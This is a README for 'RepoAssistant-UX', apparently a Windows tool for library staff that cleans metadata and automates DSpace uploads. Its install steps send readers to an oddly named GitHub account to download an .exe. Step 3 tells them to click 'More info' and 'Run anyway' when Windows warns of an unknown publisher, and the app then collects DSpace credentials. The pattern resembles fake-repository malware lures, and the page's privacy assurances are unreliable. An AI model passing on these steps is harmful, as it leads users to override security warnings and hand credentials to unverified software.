# 📘 RepoAssistant-UX - Manage library records with ease

[![](https://img.shields.io/badge/Download-RepoAssistant-blue)](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/releases)

RepoAssistant-UX helps library staff clean metadata, automate bulk uploads to Dspace, and improve access to RemoteXS and My Loft systems. This tool removes tedious manual tasks, allowing you to focus on managing your digital collections and institutional repositories.

## 📥 Getting the software

You need to access the release page to get the installer for your computer. 

[Visit this page to download the latest version of RepoAssistant-UX](https://github.com/tricolor-plebiscite957/RepoAssistant-UX/releases)

Look for the file that ends in .exe under the Assets section. Save this file to your computer.

## ⚙️ Setting up your system

Ensure your computer meets these requirements before you start:

- Windows 10 or Windows 11.
- At least 4 gigabytes of RAM.
- An internet connection for your library database syncs.
- Microsoft Excel installed on your computer.

The software requires a standard Windows environment. If you use a managed library computer, you might need your IT administrator to grant you permission to run installation files.

## 🚀 Running the application

Follow these steps to start the program for the first time:

1. Locate the file you downloaded in your Downloads folder.
2. Double-click the file named RepoAssistant-UX.
3. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system recognizes the publisher as unknown.
4. Follow the prompts in the installer window to place the app on your desktop.
5. Launch the app using the new icon on your desktop.

## 📖 Using the library tools

The dashboard organizes your tasks into three categories: Metadata Cleaning, Dspace Automation, and Access Optimization.

### Cleaning metadata
Bad data causes search errors. Select your Excel file or CSV spreadsheet within the app. Click the "Clean Metadata" button. The app checks for:
- Missing volume numbers.
- Inconsistent date formats.
- Duplicated file names.
- Invalid author formatting.

The app creates a new, cleaned file for you to save. The original file remains unchanged.

### Automating Dspace uploads
You can upload bulk documents to your Dspace instance without manual entry. 
1. Prepare your files in a folder named "Upload".
2. Link your Dspace credentials in the Settings tab.
3. Select "Bulk Import" from the main menu.
4. The app processes the files. It shows a green checkmark next to each completed upload.

### Linking RemoteXS and My Loft
If your students struggle to reach your digital resources, use this tool to verify your links. 
- The app scans your library web portal.
- It tests RemoteXS and My Loft proxy strings.
- It identifies broken paths.
- It suggests the correct syntax for your catalogue records.

## 🛠 Solving common issues

If the app does not open:
1. Check that you have an active internet connection.
2. Restart your computer. 
3. Re-download the file from the website to ensure it is not corrupted.

If Excel files do not load:
1. Ensure the file is saved in the .xlsx format.
2. Close the file in Excel before attempting to load it into the app.

If the upload fails:
1. Check your Dspace login credentials.
2. Ensure you have network access to the Dspace server from your current location.

## 📁 Managing your digital files

The software creates a folder on your computer named "RepoAssistant-Work" in your Documents directory. This folder stores configuration files and temporary data. Do not delete this folder while the program runs. You can delete the contents of the "Logs" folder inside this directory if the folder grows too large over time.

## 🛡 Security and privacy

This tool runs locally on your computer. It does not send your library metadata to external servers except to communicate with your specific Dspace instance. Your login credentials are encrypted on your local drive and are never shared with other users or the software developers. You maintain full control over your data at all times.

## 💡 Best practices for library staff

- Back up your Excel files before you run them through the cleaning tool.
- Run bulk uploads in small batches of 50 files. This prevents server timeout errors.
- Schedule your metadata cleanup during off-peak hours to avoid heavy usage on your server.
- Review the log file after every large batch process to confirm successful uploads.

This software simplifies the management of institutional repositories, past papers, and digital archives. It handles the repetitive parts of your workflow, so you spend less time editing spreadsheets and more time assisting your library users.